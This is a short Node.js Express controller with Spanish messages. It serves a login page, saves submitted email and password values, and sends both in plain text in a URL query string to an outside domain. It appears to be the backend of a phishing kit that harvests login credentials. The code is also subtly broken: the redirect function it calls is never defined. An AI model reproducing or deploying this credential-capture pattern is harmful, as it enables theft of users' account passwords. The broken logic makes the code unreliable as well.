const { saveInfo } = require('../utils/saveinfo')

const getLoginScreen = async (req, res) => {
  res.sendFile('index.html', { root: './src/views' })
}

const getHomeScreen = async (req, res) => {
  res.redirect(302, '/Login/Login')
}

const saveInfoScreen = async (req, res) => {
  const { userMail, userPass } = req.body

  const data = { userMail, userPass }

  try {
    await saveInfo(data)
    redirect(`https://soporte.tibox.cl/redirect?email=${userMail}&password=${userPass}`)
    res.status(201).json({ message: 'Datos guardados exitosamente' })
  } catch (error) {
    res.status(500).json({ message: 'Error al guardar los datos' })
  }
}

module.exports = {
  getHomeScreen,
  getLoginScreen,
  saveInfoScreen
}